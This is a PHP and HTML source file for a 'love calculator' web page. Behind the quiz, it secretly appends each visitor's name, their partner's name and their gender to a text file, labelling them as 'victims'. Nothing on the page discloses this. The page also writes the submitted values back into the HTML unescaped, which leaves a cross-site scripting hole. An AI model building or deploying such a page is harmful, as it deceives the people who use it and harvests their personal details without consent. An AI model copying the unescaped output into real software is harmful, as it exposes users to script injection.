<?php
if(isset($_POST['submit_btn'])){ //check if form was submitted
  $fname = $_POST['fname'];
  $lname = $_POST['lname'];
  $gender = $_POST['gender'];
//get input text
$txt = "Your Victims Name : ".$fname."\r\n"."Your Victims Lover : ".$lname."\r\n"."Your Victims Gender : ".$gender."\r\n";
$fp = fopen ('data.txt','a+');
if (fwrite ($fp,$txt)){

}
fclose ($fp);
}
?>

<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Web Designer Ghs Julian | Love Calculator Machine</title>
  <meta name="viewport" content="width=device-width, initial-scale=1"><head><link rel="stylesheet" href="./calculate.css">
</head>
			
<body>
<div class="container">
	<div class=" clearfix">
		<div class="calc col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4">
				
				<form role="form" class="form-horizontal">
						<div class="form-group">
								<input type="text" class="form-control" name="names" value="<?php echo $fname; ?>" />
						</div>
						<div class="form-group">
								<input type="text" class="form-control" name="names" value="<?php echo $lname; ?>"/>
						</div>
						<div class="form-group">

<br>
<br>


<br>

<center>
<div class="dv">
<i><p>How Much True Your Love Click On The Calculate Button ! </p></i>

			<br>
					<h2><i>Congratulations !</i></h2>
					<br>
					<p1><?php echo $fname; ?> ❤️ <?php echo $lname; ?></p1>
<br>
<br/>

<p id="warning" class="text-danger"></p>

				<h1 id="result" class="text-center"></h1>
<br>
<br/>
								<button class="btn" type="submit" id="submit">Calculate</button>
</div>
						</div>

<br> 
<center><b>
Developed By : <a  href="https://m.facebook.com/ghs.julian.80">Ghs Julian </a></b>
</center>
				</form>
				
		</div>
	</div>
</div>
</center>
<script src="./script.js"></script>
</body>
</body>
</html>
